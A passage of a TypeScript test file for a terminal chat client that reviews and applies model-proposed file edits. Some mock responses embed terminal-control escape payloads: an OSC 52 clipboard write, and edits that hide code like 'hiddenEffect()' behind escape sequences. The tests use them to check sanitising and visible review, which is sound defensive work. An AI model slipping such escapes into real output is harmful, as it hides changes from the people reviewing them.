    ui.input.setText("/new"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /Tokens: —/);
    assert.match(setup.captureCharFrame(), /Files referenced \(0\)/);
    assert.match(setup.captureCharFrame(), /Skills \(0\)/);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("empty/escaped mention menus do not intercept Enter; Shift+Enter keeps composing", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-ui-picker-"));
  const setup = await createTestRenderer({ width: 80, height: 28, kittyKeyboard: true });
  try {
    let requests = 0;
    const client: ChatClient = { chat: { completions: { async create() {
      requests++;
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Answer" } },
      ] };
    } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    await writeFile(path.join(cwd, "unindexed.ts"), "file");
    ui.input.setText("Explain @unindexed.ts"); ui.input.gotoBufferEnd();
    setup.mockInput.pressEnter(); await waitUntilIdle(ui);
    assert.equal(requests, 1, "exact unindexed references can still be submitted");
    ui.setCandidates(["unindexed.ts"]);
    ui.input.setText("Explain @un"); ui.input.gotoBufferEnd();
    setup.mockInput.pressEnter({ shift: true });
    assert.equal(ui.input.plainText, "Explain @un\n");
    assert.equal(requests, 1);
    ui.input.setText("Explain @unindexed.ts"); ui.input.gotoBufferEnd();
    setup.mockInput.pressEscape();
    assert.equal(ui.picker.visible, false);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui);
    assert.equal(requests, 2);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("long transcripts keep the footer/composer visible; clipboard fallback and missing usage are explicit", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-ui-overflow-"));
  const setup = await createTestRenderer({ width: 130, height: 32, kittyKeyboard: true });
  try {
    let requests = 0;
    const answer = "**Safe**\u001b]52;c;untrusted\u0007 text\n\n" + "A long answer line.\n".repeat(100);
    const client: ChatClient = { chat: { completions: { async create() {
      requests++;
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: answer } },
      ] };
    } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    const copied: string[] = [];
    setup.renderer.copyToClipboardOSC52 = (text: string) => { copied.push(text); return false; };
    ui.input.setText("/copy"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.deepEqual(copied, []);
    ui.input.setText("Hello"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.ok(ui.input.y > 0 && ui.input.y + ui.input.height < setup.renderer.height);
    assert.equal(ui.footerRight.y, setup.renderer.height - 2);
    assert.match(setup.captureCharFrame(), /Tokens: unknown/);
    assert.match(setup.captureCharFrame(), /Window limit: unknown/);
    ui.input.setText("/copy"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(copied.length, 1);
    assert.doesNotMatch(copied[0]!, /\u001b|untrusted/);
    assert.match(copied[0]!, /^\*\*Safe\*\* text/);
    assert.match(setup.captureCharFrame(), /Clipboard unavailable/);
    setup.resize(45, 20); await setup.flush();
    assert.equal(ui.footerRight.y, setup.renderer.height - 2);
    assert.equal(ui.footerRight.x + ui.footerRight.width, setup.renderer.width - 1);
    ui.setCandidates(["a.ts", "b.ts", "folder/", "z.ts"]);
    ui.input.setText("@"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.equal(ui.picker.y + ui.picker.height, ui.composer.y);
    assert.ok(ui.picker.y >= 0);
    assert.equal(requests, 1);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("/skill and /skills share a searchable selection popup with active markers and no model requests", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-ui-skills-"));
  const setup = await createTestRenderer({ width: 100, height: 35, kittyKeyboard: true });
  try {
    const root = path.join(cwd, "skills");
    await mkdir(root);
    await writeFile(path.join(root, "review.md"), "---\nname: code-review\ndescription: Check correctness\n---\nReview carefully.");
    await writeFile(path.join(root, "format.md"), "---\nname: formatting\ndescription: Style rules\n---\nMatch the style.");
    const client: ChatClient = { chat: { completions: { create: async () => { throw new Error("must not submit"); } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [root] });
    const ui = mountChatUI(setup.renderer, chat, "test");
    async function command(text: string) {
      ui.input.setText(text); ui.input.gotoBufferEnd();
      await waitUntilIdle(ui); await setup.flush();
      setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
    }
    await command("/skills");
    assert.match(setup.captureCharFrame(), /Select skills/);
    assert.deepEqual(chat.activeSkillNames, [], "opening a popup must not select anything");
    await setup.mockInput.typeText("correctness"); await setup.flush();
    assert.match(setup.captureCharFrame(), /code-review/);
    assert.doesNotMatch(setup.captureCharFrame(), /formatting/);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.activeSkillNames, ["code-review"]);
    assert.match(setup.captureCharFrame(), /✓ code-review/);
    assert.equal(ui.picker.visible, true, "popup stays open to select multiple skills");
    await command("/skill");
    assert.match(setup.captureCharFrame(), /Select skills/);
    assert.match(setup.captureCharFrame(), /✓ code-review/);
    const skillRows = popupRows(ui.picker).chunks.map((part) => part.text).join("").split("\n");
    const activeRow = skillRows.find((line) => line.includes("code-review"))!;
    const inactiveRow = skillRows.find((line) => line.includes("formatting"))!;
    assert.equal(activeRow.indexOf("code-review"), inactiveRow.indexOf("formatting"));
    assert.match(inactiveRow, /^[ ›] {3}formatting/);
    await setup.mockInput.typeText("style"); await setup.flush();
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.activeSkillNames, ["code-review", "formatting"]);
    await command("/skills review");
    assert.deepEqual(chat.activeSkillNames, ["formatting"], "Enter disables an active skill");
    assert.doesNotMatch(setup.captureCharFrame(), /✓ code-review/);
    assert.equal(ui.picker.visible, true);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.activeSkillNames, ["formatting", "code-review"], "Enter enables the skill again");
    assert.match(setup.captureCharFrame(), /✓ code-review/);
    await command("/unskill code-review");
    assert.deepEqual(chat.activeSkillNames, ["formatting"]);
    await command("/skill code-review");
    await command("/new");
    assert.deepEqual(chat.activeSkillNames, []);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("skill popup handles empty discovery, refreshes on reopen, and does not reopen after Escape", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-empty-skills-"));
  const setup = await createTestRenderer({ width: 100, height: 35, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not submit"); } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [cwd] });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.input.setText("/skill "); ui.input.gotoBufferEnd();
    await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /No matching skills/);
    setup.mockInput.pressEnter();
    assert.deepEqual(chat.activeSkillNames, []);
    setup.mockInput.pressEscape();
    assert.equal(ui.input.plainText, "");
    await writeFile(path.join(cwd, "new.md"), "---\nname: new-skill\n---\nInstructions");
    ui.input.setText("/skills "); ui.input.gotoBufferEnd();
    await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /new-skill/);
    setup.mockInput.pressEscape();
    let finish!: (skills: []) => void;
    chat.availableSkills = () => new Promise((resolve) => { finish = resolve; });
    ui.input.setText("/skill "); ui.input.gotoBufferEnd();
    await setup.flush();
    assert.equal(ui.loadingSkills, true);
    setup.mockInput.pressEscape();
    finish([]);
    await setup.flush();
    assert.equal(ui.picker.visible, false);
    assert.equal(ui.input.plainText, "");
    assert.equal(ui.loadingSkills, false);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("context cwd/session metadata stays visible but is never selectable", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-context-metadata-"));
  const setup = await createTestRenderer({ width: 100, height: 35, kittyKeyboard: true });
  try {
    await writeFile(path.join(cwd, "alpha.md"), "---\nname: alpha\n---\nInstructions");
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [cwd] });
    await chat.selectSkills(["alpha"]);
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.input.setText("/context "); ui.input.gotoBufferEnd(); await setup.flush();
    assert.match(setup.captureCharFrame(), /Working directory:/);
    assert.match(setup.captureCharFrame(), /Session: 0 response\(s\)/);
    assert.match(setup.captureCharFrame(), /Skills/);
    assert.match(setup.captureCharFrame(), /Files/);
    assert.match(setup.captureCharFrame(), /No files attached/);
    assert.doesNotMatch(setup.captureCharFrame(), /No skills attached/);
    assert.equal(ui.picker.y + ui.picker.height, ui.composer.y);
    ui.input.setText("/context no-such-item"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.match(setup.captureCharFrame(), /No matching skills/);
    assert.match(setup.captureCharFrame(), /No files attached/);
    ui.input.setText("/context alpha"); ui.input.gotoBufferEnd(); await setup.flush();
    for (let index = 0; index < 10; index++) setup.mockInput.pressArrow("down");
    await setup.flush();
    assert.match(setup.captureCharFrame(), /› alpha\s+Remove skill/);
    assert.doesNotMatch(setup.captureCharFrame(), /› (?:Working directory|Session|Skills|Files)/);
    setup.mockInput.pressEnter(); await setup.flush();
    assert.deepEqual(chat.activeSkillNames, []);
    assert.match(setup.captureCharFrame(), /No skills attached/);
    assert.match(setup.captureCharFrame(), /No files attached/);
    assert.doesNotMatch(setup.captureCharFrame(), /No matching items/);
    assert.match(setup.captureCharFrame(), /Working directory:/);
    assert.match(setup.captureCharFrame(), /Session: 0 response\(s\)/);
    setup.mockInput.pressEnter();
    assert.equal(setup.renderer.isDestroyed, false);
    assert.deepEqual(chat.activeSkillNames, []);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("transcript scrollbar spacing is reserved only while content overflows", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-scrollbar-gap-"));
  const setup = await createTestRenderer({ width: 110, height: 35, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    await setup.flush();
    assert.equal(ui.transcript.verticalScrollBar.visible, false);
    assert.equal(ui.transcript.content.width, ui.transcript.width);
    const text = new TextRenderable(setup.renderer, {
      content: Array.from({ length: 60 }, (_, index) => `Line ${index}`).join("\n"), width: "100%", flexShrink: 0,
    });
    ui.transcript.add(text); await setup.flush();
    assert.equal(ui.transcript.verticalScrollBar.visible, true);
    assert.equal(ui.transcript.verticalScrollBar.width, 3, "one scrollbar column plus two gap columns");
    assert.equal(text.width, ui.transcript.width - 3);
    setup.resize(110, 100); await setup.flush();
    assert.equal(ui.transcript.verticalScrollBar.visible, false);
    assert.equal(text.width, ui.transcript.width);
    setup.resize(110, 35); await setup.flush();
    assert.equal(ui.transcript.verticalScrollBar.visible, true);
    assert.equal(text.width, ui.transcript.width - 3);
    ui.input.setText("/clear"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.transcript.verticalScrollBar.visible, false);
    assert.equal(ui.transcript.content.width, ui.transcript.width);
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("/clear clears the transcript and proposals while retaining attachments, skills and theme", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-clear-ui-"));
  const setup = await createTestRenderer({ width: 120, height: 45, kittyKeyboard: true });
  try {
    await writeFile(path.join(cwd, "example.ts"), "old\n");
    await mkdir(path.join(cwd, "skills"));
    await writeFile(path.join(cwd, "skills/review.md"), "---\nname: review\n---\nReview instructions");
    let requests = 0;
    const client: ChatClient = { chat: { completions: { async create() {
      requests++;
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
          content: 'OLD_RESPONSE\n<update path="example.ts">\n<<<<<<< SEARCH\nold\n=======\nnew\n>>>>>>> REPLACE\n</update>' } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [path.join(cwd, "skills")] });
    await chat.selectSkills(["review"]);
    const ui = mountChatUI(setup.renderer, chat, "test", { theme: "dracula" });
    ui.input.setText("OLD_PROMPT @example.ts please"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(chat.pendingCount, 1);
    const oldNodes = [...ui.transcript.getChildren()];
    ui.input.setText("/cle"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.match(popupRows(ui.picker).plainText, /\/clear/);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.ok(oldNodes.every((node) => node.isDestroyed));
    assert.doesNotMatch(setup.captureCharFrame(), /OLD_PROMPT|OLD_RESPONSE/);
    assert.match(setup.captureCharFrame(), /attachments and skills kept/);
    assert.deepEqual(chat.attachmentPaths, ["example.ts"]);
    assert.deepEqual(chat.activeSkillNames, ["review"]);
    assert.deepEqual(ui.theme, { name: "dracula", mode: "dark" });
    assert.equal(chat.lastAnswer, null);
    assert.equal(chat.pendingCount, 0);
    assert.equal(chat.sessionStats.turns, 0);
    assert.equal(requests, 1);
    assert.equal(await readFile(path.join(cwd, "example.ts"), "utf8"), "old\n");
    ui.input.setText("/new"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.attachmentPaths, []);
    assert.deepEqual(chat.activeSkillNames, []);
    assert.equal(requests, 1);
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("OpenTUI composer completes mentions, submits once, reviews and applies locally", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-ui-"));
  const setup = await createTestRenderer({ width: 100, height: 35, kittyKeyboard: true });
  try {
    await writeFile(path.join(cwd, "example.ts"), "const a = 1;\n");
    const requests: OneShotRequest[] = [];
    const client: ChatClient = { chat: { completions: { async create(request) {
      requests.push(request);
      return { id: "test", object: "chat.completion", created: 0, model: "test",
        choices: [{ index: 0, finish_reason: "stop", logprobs: null, message: {
          role: "assistant", refusal: null,
          content: 'Suggested edit.\n```ts\nconst example = true;\n```\n<update path="example.ts">\n<<<<<<< SEARCH\nconst a = 1;\n=======\nconst a = 2;\n>>>>>>> REPLACE\n</update>',
        } }],
      };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.setCandidates(["example.ts", "src/"]);
    await setup.mockInput.typeText("Improve @ex");
    await setup.flush();
    assert.match(setup.captureCharFrame(), /example.ts/);
    assert.equal(ui.picker.y + ui.picker.height, ui.composer.y, "popup sits immediately above composer");
    const transcriptHeight = ui.transcript.height;
    setup.mockInput.pressEnter();
    assert.equal(ui.input.plainText, "Improve @example.ts ");
    assert.equal(requests.length, 0, "Enter accepts the mention, not the question");
    await setup.flush();
    assert.equal(ui.transcript.height, transcriptHeight, "popup does not reflow transcript");
    setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    await setup.flush();
    assert.equal(requests.length, 1);
    assert.equal(chat.pendingCount, 1);
    const summary = setup.captureCharFrame();
    assert.match(summary, /example\.ts\s+\+1 -1/);
    assert.match(summary, /\/review/);
    assert.match(summary, /\+const a = 2;/, "diffs are previewed by default, but still require explicit review");
    assert.equal(await readFile(path.join(cwd, "example.ts"), "utf8"), "const a = 1;\n");
    // Applying before reviewing is refused and writes nothing.
    await setup.mockInput.typeText("/apply");
    setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.equal(ui.input.plainText, "/apply", "the refused command is restored as a draft");
    ui.input.setText(""); await setup.flush(); // closes the command menu covering the message
    assert.match(setup.captureCharFrame(), /Use \/review before \/apply/);
    assert.equal(await readFile(path.join(cwd, "example.ts"), "utf8"), "const a = 1;\n");
    await setup.mockInput.typeText("/review");
    setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /\+const a = 2;/);
    await setup.mockInput.typeText("/apply");
    setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.equal(requests.length, 1);
    assert.equal(await readFile(path.join(cwd, "example.ts"), "utf8"), "const a = 2;\n");
    setup.resize(55, 24);
    await setup.flush();
    assert.match(setup.captureCharFrame(), /ask/);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("approval diffs expose terminal-control payloads that will be written", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-review-controls-"));
  const setup = await createTestRenderer({ width: 180, height: 50, kittyKeyboard: true });
  try {
    const original = "const safe = true;\n";
    const proposed = "const safe = true; /*\x1b]0;*/globalThis.hiddenEffect = true;/*\x07*/\n";
    await writeFile(path.join(cwd, "example.js"), original);
    const client: ChatClient = { chat: { completions: { async create() {
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
          content: `<update path="example.js">\n<<<<<<< SEARCH\n${original.trimEnd()}\n=======\n${proposed.trimEnd()}\n>>>>>>> REPLACE\n</update>` } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.input.setText("Improve @example.js"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    ui.input.setText("/review"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    const frame = setup.captureCharFrame();
    assert.match(frame, /globalThis\.hiddenEffect = true/);
    assert.match(frame, /\\u001b\]0;/);
    assert.match(frame, /\\u0007/);
    assert.equal(await readFile(path.join(cwd, "example.js"), "utf8"), original);
    ui.input.setText("/apply"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.equal(await readFile(path.join(cwd, "example.js"), "utf8"), proposed);
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

for (const updateView of ["search-replace", "diff"] as const) {
  test(`update panels toggle from ${updateView}, retain control payloads and never authorize writes`, async () => {
    const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-update-view-"));
    const setup = await createTestRenderer({ width: 140, height: 60, kittyKeyboard: true });
    try {
      const original = "const safe = true;\n";
      const replacement = 'const safe = false; /*\x1b]0;*/hiddenEffect();/*\x07*/';
      await writeFile(path.join(cwd, "example.js"), original);
      const raw = `<update path="example.js">\n<<<<<<< SEARCH\n${original.trimEnd()}\n=======\n${replacement}\n>>>>>>> REPLACE\n</update>`;
      let requests = 0;
      const client: ChatClient = { chat: { completions: { async create() {
        requests++;
        return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
          { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null,
            content: `BEFORE_PANEL\n\n${raw}\n\nAFTER_PANEL` } },
        ] };
      } } } };
      const chat = new TuiChat(client, { cwd });
      const ui = mountChatUI(setup.renderer, chat, "test", { updateView });
      ui.input.setText("Improve @example.js please"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
      const panel = ui.transcript.getChildren().find((node) => node.id.startsWith("update-"));
      assert.ok(panel instanceof BoxRenderable);
      const header = panel.getChildren().find((node) => node.id.endsWith("-toggle"));
      const code = panel.getChildren().find((node) => node.id.endsWith("-block"));
      assert.ok(code instanceof BoxRenderable);
      const body = code.getChildren().find((node) => node.id.endsWith("-code"));
      assert.ok(header instanceof BoxRenderable && body instanceof TextRenderable);
      const hint = header.getChildren().find((node) => node.id.endsWith("-hint"));
      assert.ok(hint instanceof TextRenderable);
      assert.equal(hint.x + hint.width, code.x + code.width);
      assert.equal(hint.y, header.y);
      const text = () => body.chunks.map((chunk) => chunk.text).join("");
      const check = (diff: boolean) => {
        assert.match(text(), /hiddenEffect\(\)/);
        assert.match(text(), /\\u001b\]0;/);
        assert.match(text(), /\\u0007/);
        assert.doesNotMatch(text(), /\x1b|\x07/);
        if (diff) {
          assert.match(text(), /-const safe = true;/);
          assert.match(text(), /\+const safe = false;/);
          assert.doesNotMatch(text(), /<<<<<<< SEARCH/);
        } else assert.match(text(), /<<<<<<< SEARCH[\s\S]*=======/);
        assert.deepEqual(body.chunks.find((chunk) => chunk.text.includes("const safe = true;"))?.fg?.toInts(), [253, 164, 175, 255]);
        assert.deepEqual(body.chunks.find((chunk) => chunk.text.includes("const safe = false;"))?.fg?.toInts(), [167, 243, 208, 255]);
      };
      check(updateView === "diff");
      const frame = setup.captureCharFrame();
      assert.ok(frame.indexOf("BEFORE_PANEL") < frame.indexOf("click for"));
      assert.ok(frame.indexOf("click for") < frame.indexOf("AFTER_PANEL"));
      assert.doesNotMatch(frame, /Snippet preview/);
      assert.ok(header.y < code.y);
      assert.equal(code.x, panel.x + 2);
      assert.equal(code.width, panel.width - 2);
      assert.equal(code.backgroundColor.toInts()[3], 0);
      await setup.mockMouse.click(header.x + 2, header.y); await setup.flush();
      check(updateView !== "diff");
      await assert.rejects(chat.apply(), /Use \/review before \/apply/);
      assert.equal(await readFile(path.join(cwd, "example.js"), "utf8"), original);
      assert.equal(requests, 1);
      await setup.mockMouse.click(header.x + 2, header.y); await setup.flush();
      check(updateView === "diff");
      setup.resize(24, 60); await setup.flush();
      assert.ok(hint.y > header.y);
      assert.equal(hint.x, header.x);
      setup.resize(140, 60); await setup.flush();
      assert.equal(hint.y, header.y);
      assert.equal(hint.x + hint.width, code.x + code.width);
      // Panel styling follows a live theme change, and /new owns its disposal.
      ui.input.setText("/theme dracula"); ui.input.gotoBufferEnd(); await setup.flush();
      setup.mockInput.pressEnter(); await setup.flush();
      assert.ok(code.borderColor.equals(parseColor(themePalette("dracula").border)));
      assert.equal(code.backgroundColor.toInts()[3], 0);
      ui.input.setText("/new"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
      assert.ok(panel.isDestroyed && header.isDestroyed && body.isDestroyed);
      assert.doesNotMatch(setup.captureCharFrame(), /BEFORE_PANEL|hiddenEffect/);
    } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
  });
}

test("update actions share per-file review, cancel, apply and reject state with commands", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-update-actions-"));
  const setup = await createTestRenderer({ width: 140, height: 100, kittyKeyboard: true });
  try {
    const original = "context line\nold one\nold two\n";
    await writeFile(path.join(cwd, "a.ts"), original);
    await writeFile(path.join(cwd, "b.ts"), "old\n");
    const block = (file: string, before: string, after: string) => `<update path="${file}">\n<<<<<<< SEARCH\n${before}\n=======\n${after}\n>>>>>>> REPLACE\n</update>`;
    let response = [block("a.ts", "old one", "new one"), block("a.ts", "old two", "new two"), block("b.ts", "old", "new")].join("\n");
    let requests = 0;
    const client: ChatClient = { chat: { completions: { async create() {
      requests++;
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: response } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    async function send(text: string) {
      ui.input.setText(text); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
      await waitUntilIdle(ui); await setup.flush();
    }
    function node(parent: Renderable, suffix: string): Renderable {
      const found = find(parent, suffix);
      assert.ok(found, `Missing ${suffix}`);
      return found;
    }
    function find(parent: Renderable, suffix: string): Renderable | undefined {
      for (const child of parent.getChildren()) {
        if (child.id.endsWith(suffix)) return child;
        const found = find(child, suffix);
        if (found) return found;
      }
      return undefined;
    }
    async function click(panel: Renderable, action: string) {
      const button = node(panel, `-${action}`);
      assert.ok(button.visible);
      await setup.mockMouse.click(button.x + 2, button.y);
      await waitUntilIdle(ui); await setup.flush();
    }
    await send("Fix @a.ts @b.ts");
    const panels = ui.transcript.getChildren().filter((child) => child.id.startsWith("update-"));
    assert.equal(panels.length, 3);
    const [first, second, other] = panels as [Renderable, Renderable, Renderable];
    for (const panel of panels) {
      assert.ok(node(panel, "-actions").visible && node(panel, "-review").visible && node(panel, "-reject").visible);
      assert.ok(!node(panel, "-apply").visible);
      const code = node(panel, "-block");
      const review = node(panel, "-review");
      const row = node(panel, "-actions");
      assert.ok(row.y > node(panel, "-code").y);
      assert.equal(row.y + row.height, code.y + code.height - 1);
      assert.equal(review.x, code.x + 2);
    }
    ui.input.setText("keep my draft");
    const content = (panel: Renderable) => (node(panel, "-code") as TextRenderable).chunks.map((chunk) => chunk.text).join("");
    const preview = content(first);
    assert.equal(content(second), preview, "both blocks preview every edit to the same file");
    assert.equal(preview, chat.previewDetails(["a.ts"])[0]!.diff);
    await assert.rejects(chat.apply(["a.ts"]), /Use \/review before \/apply/);
    const reviewPosition = { x: node(first, "-review").x + 2, y: node(first, "-review").y };
    await click(first, "review");
    await setup.mockMouse.click(reviewPosition.x, reviewPosition.y); await setup.flush();
    assert.equal(await readFile(path.join(cwd, "a.ts"), "utf8"), original, "a second click at Review must not apply");
    for (const panel of [first, second]) {
      assert.ok(node(panel, "-apply").visible && node(panel, "-cancel").visible);
      assert.ok(!node(panel, "-review").visible && !node(panel, "-reject").visible);
      const code = node(panel, "-block");
      const cancel = node(panel, "-cancel");
      const guidance = node(panel, "-guidance");
      const row = node(panel, "-actions");
      assert.ok(row.y > node(panel, "-code").y);
      assert.equal(row.y + row.height, code.y + code.height - 1);
      assert.equal(cancel.x + cancel.width, code.x + code.width - 2);
      assert.equal(guidance.x, code.x + 2);
      assert.equal(guidance.y, cancel.y);
      const body = node(panel, "-code") as TextRenderable;
      const text = body.chunks.map((chunk) => chunk.text).join("");
      assert.equal(text, preview, "Review must not change the displayed diff");
      assert.match(text, /context line/);
      assert.match(text, /\+new one/); assert.match(text, /\+new two/);
    }
    assert.match(setup.captureCharFrame(), /Apply will modify this file/);
    assert.ok(node(other, "-review").visible);
    assert.equal(await readFile(path.join(cwd, "a.ts"), "utf8"), original);
    await click(second, "cancel");
    assert.equal(content(first), preview, "Cancel retains the same diff preview");
    assert.ok(node(first, "-review").visible && node(second, "-review").visible);
    await assert.rejects(chat.apply(["a.ts"]), /Use \/review before \/apply/);
    assert.equal(chat.pendingCount, 2);
    assert.equal(ui.input.plainText, "keep my draft");
    await click(first, "review");
    await click(first, "apply");
    assert.equal(await readFile(path.join(cwd, "a.ts"), "utf8"), "context line\nnew one\nnew two\n");
    for (const panel of [first, second]) {
      assert.ok(node(panel, "-actions").visible && node(panel, "-applied").visible);
      assert.ok(!node(panel, "-buttons").visible);
      assert.equal((node(panel, "-applied") as TextRenderable).plainText, "Applied");
    }
    assert.equal(chat.pendingCount, 1);
    await click(other, "reject");
    assert.equal(await readFile(path.join(cwd, "b.ts"), "utf8"), "old\n");
    assert.equal(chat.pendingCount, 0);
    assert.ok(node(other, "-actions").visible && node(other, "-rejected").visible);
    assert.ok(!node(other, "-buttons").visible);
    assert.equal((node(other, "-rejected") as TextRenderable).plainText, "Rejected");
    assert.equal(requests, 1);
    // A new proposal for the same path must never revive old response buttons.
    response = block("a.ts", "new one", "final one");
    await send("Improve it again");
    const latest = ui.transcript.getChildren().filter((child) => child.id.startsWith("update-")).at(-1)!;
    const latestPreview = content(latest);
    await send("/review a.ts");
    assert.equal(content(latest), latestPreview, "/review uses the same preview diff");
    assert.ok(node(latest, "-apply").visible);
    assert.ok(node(first, "-applied").visible && !node(first, "-buttons").visible);
    await send("/apply a.ts");
    assert.ok(node(latest, "-applied").visible && !node(latest, "-buttons").visible);
    assert.equal(await readFile(path.join(cwd, "a.ts"), "utf8"), "context line\nfinal one\nnew two\n");
    assert.equal(requests, 2);
    assert.ok(node(other, "-rejected").visible, "rejection remains visible in earlier responses");
    response = block("b.ts", "old", "new");
    await send("Try another change");
    const last = ui.transcript.getChildren().filter((child) => child.id.startsWith("update-")).at(-1)!;
    await send("/review b.ts");
    await send("/reject b.ts");
    assert.ok(node(last, "-actions").visible && node(last, "-rejected").visible);
    assert.ok(!node(last, "-buttons").visible && !node(last, "-guidance").visible);
    assert.equal(await readFile(path.join(cwd, "b.ts"), "utf8"), "old\n");
  } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
});

test("conflicting, unmatched and incomplete proposals have no block actions", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-update-conflicts-"));
  const setup = await createTestRenderer({ width: 120, height: 60, kittyKeyboard: true });
  try {
    await writeFile(path.join(cwd, "a.ts"), "old\n");
    const block = (search: string) => `<update path="a.ts">\n<<<<<<< SEARCH\n${search}\n=======\nnew\n>>>>>>> REPLACE\n</update>`;
    let response = "";
    let finish: "stop" | "length" = "stop";
    const client: ChatClient = { chat: { completions: { async create() {
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: finish, logprobs: null, message: { role: "assistant", refusal: null, content: response } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
